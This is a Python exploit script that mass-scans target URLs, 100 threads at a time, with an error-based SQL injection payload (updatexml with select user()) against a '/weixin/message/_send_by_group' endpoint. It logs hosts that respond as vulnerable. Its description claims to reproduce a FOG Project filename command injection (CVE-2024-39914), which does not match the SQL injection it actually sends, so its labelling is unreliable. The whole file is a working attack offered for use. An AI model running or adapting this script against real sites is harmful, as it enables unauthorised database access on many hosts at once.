import requests,argparse,sys,json,re
from multiprocessing.dummy import Pool
from requests.packages import urllib3
#关闭警告
GREEN = '\033[92m'
RESET = '\033[0m'
urllib3.disable_warnings()
def banner():
    test="""
                  _      
                 | |     
  _   _ _   _  __| |___  
 | | | | | | |/ _` / __| 
 | |_| | |_| | (_| \__ \ 
  \__, |\__, |\__,_|___/ 
   __/ | __/ |           
  |___/ |___/            
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="FOG Project 文件名命令注入漏洞复现（CVE-2024-39914）")
    parser.add_argument('-u','--url',dest='url',type=str,help='link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
	payload_url = "/public/index.php/weixin/message/_send_by_group"
	url = target + payload_url
	headers={
		'Content-Type': 'application/x-www-form-urlencoded',
		'Accept-Encoding': 'gzip',
		'Connection': 'close'
	}
	data="group_id[0]=exp&group_id[1]=%29+and+updatexml%281%2Cconcat%280x7e%2C%28select+user%28%29%29%2C0x7e%29%2C1%29+--"

	try:
		res = requests.get(url=target,verify=False)
		res1 = requests.post(url=url,headers=headers,data=data,verify=False)
		if res.status_code == 200:
			if res1.status_code == 200 and "~" in res1.text:
		
				print(f"{GREEN}[+]该url存在SQL注入漏洞:{target}{RESET}")
				with open("result.txt","a",encoding="utf-8") as f:
					f.write(target+"\n")
			else:
				print(f"[-]该url不存在SQL注入漏洞:{target}")
		else:
			print(f"该url连接失败:{target}")
	except:
		print(f"[*]该url出现错误:{target}")

if __name__ == '__main__':
    main()
